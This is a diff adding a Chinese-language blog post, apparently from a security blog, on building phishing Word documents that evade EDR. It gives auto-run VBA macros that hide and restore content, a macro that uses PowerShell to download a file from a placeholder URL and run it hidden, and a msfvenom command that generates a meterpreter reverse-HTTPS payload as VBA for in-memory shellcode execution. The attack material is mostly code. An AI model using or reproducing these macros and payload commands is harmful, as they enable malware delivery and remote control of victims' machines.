@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="google-site-verification" content="TZE0rZyIqLl10trYu3BWBWa1Vmz6HFwhb2OcNEK4u-s" />
+     <link rel="shortcut icon" href= /img/clown.svg >
+    <title>
+        Clown
+    </title>
+    <meta name="description" content= IS IT JUST ME OR IS IT GETTING CRAZIER OUT THERE? >
+    <meta name="keywords" content= Blog,Hexo,Theme,Clown,ME >
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-home
+ replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            EDR规避与绕过之网络钓鱼篇
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <p><strong>1、使用Microsoft Office钓鱼文件制作</strong></p>
+<p>由于docx无法触发宏，以下有doc文件做示例。</p>
+<ul>
+<li>新建一个doc文件</li>
+<li>填入隐藏内容</li>
+<li>选择插入-&gt;文档部件-&gt;自动图文集-&gt;将内容保存在自动图文集</li>
+<li>删除隐藏内容，之后写入基础页面内容</li>
+<li>随后编写宏脚本</li>
+</ul>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Sub Document_Open()</span><br><span class="line">    test</span><br><span class="line"><span class="keyword">End</span> Sub</span><br><span class="line">Sub AutoOpen()</span><br><span class="line">    test</span><br><span class="line"><span class="keyword">End</span> Sub</span><br><span class="line"></span><br><span class="line">Sub test()</span><br><span class="line">    ActiveDocument.Content.Select  //文档内容全选</span><br><span class="line">    Selection.<span class="keyword">Delete</span> //删除内容</span><br><span class="line">    ActiveDocument.AttachedTemplate.AutoTextEntries(<span class="string">&quot;自动添加文档集名称&quot;</span>).Insert Where:=Selection.Range, RichText:=True//将自动图文集的内容插入到页面。</span><br><span class="line"><span class="keyword">End</span> Sub</span><br></pre></td></tr></table></figure>
+
+<p><strong>2、VBA配合Powershell 实现文件下载</strong></p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Sub Document_Open()</span><br><span class="line">    test</span><br><span class="line"><span class="keyword">End</span> Sub</span><br><span class="line">Sub AutoOpen()</span><br><span class="line">    test</span><br><span class="line"><span class="keyword">End</span> Sub</span><br><span class="line">Sub test()</span><br><span class="line">   <span class="keyword">Dim</span> str As String</span><br><span class="line">   str = <span class="string">&quot;powershell (New-Object System.Net.WebClient).DownloadFile(&quot;</span>http://url/file<span class="string">&quot;,&quot;</span>filename<span class="string">&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">Dim</span> exec As String</span><br><span class="line">   exec = ActiveDocument.Path+<span class="string">&quot;\filename&quot;</span></span><br><span class="line">   Sleep(<span class="number">3</span>)</span><br><span class="line">   <span class="keyword">Shell</span> exePath,vbHide</span><br><span class="line"><span class="keyword">End</span> Sub</span><br><span class="line"></span><br><span class="line">//延时函数</span><br><span class="line">Sub Sleep(L As Long)</span><br><span class="line">	<span class="keyword">Dim</span> time As Date</span><br><span class="line">	time = Now </span><br><span class="line">	Do</span><br><span class="line">		DoEvents</span><br><span class="line">	Loop Until Now &gt;= DateAdd(<span class="string">&quot;s&quot;</span>,L,time)</span><br><span class="line"><span class="keyword">End</span> Sub</span><br></pre></td></tr></table></figure>
+
+<p><strong>3、VBA配合Window API在内存执行shellcode</strong></p>
+<p>demo:</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Private Declare PtrSafe Function &lt;FunctionName&gt; Lib <span class="string">&quot;&lt;libName&gt;&quot;</span> Alias <span class="string">&quot;&lt;AliasName&gt;&quot;</span> (Args) As Long</span><br><span class="line"></span><br><span class="line">Function FuntionName()</span><br><span class="line">    Coding----</span><br><span class="line">Function FuntionName</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>利用msfvenom 生成payload:</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f vbapplication</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+</div>
+    <div class="footer" id="footer">
+    <p><h4>Copyright © 2020 | Author: Clown | Theme By <a class="theme-author" target="_blank" rel="noopener" href="https://github.com/Xunzhuo/hexo-theme-coder" style="font-size:14px; color: #969696">Coder</a></h4>
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <span id="busuanzi_container_site_pv">Page Views: <span id="busuanzi_value_site_pv"></span></span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv">Unique Visitors: <span id="busuanzi_value_site_uv"></span></span>
+    
+    <label class="el-switch el-switch-blue el-switch-sm" style="vertical-align: sub;">
+        <input type="checkbox" name="switch" id="update_style">
+        <span class="el-switch-style"></span>
+    </label>
+
+    <!--         <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+    document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script> -->
+</p>
+</div>
+
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="">
+<input type="hidden" id="valine_appKey" value="">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+color: #698fca;
+}
+.v .vlist .vcard .vhead .vsys {
+color: #3a3e4a;
+}
+.v .vlist .vcard .vh .vmeta .vat {
+color: #638fd5;
+}
+.v .vlist .vcard .vhead .vnick {
+color: #6ba1ff;
+}
+.v a {
+color: #8696b1;
+}
+.v .vlist .vcard .vhead .vnick:hover {
+color: #669bfc;
+}
+</style>
+    <script type="text/javascript" color="173,174,173" opacity='1' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+</body>
+</html>
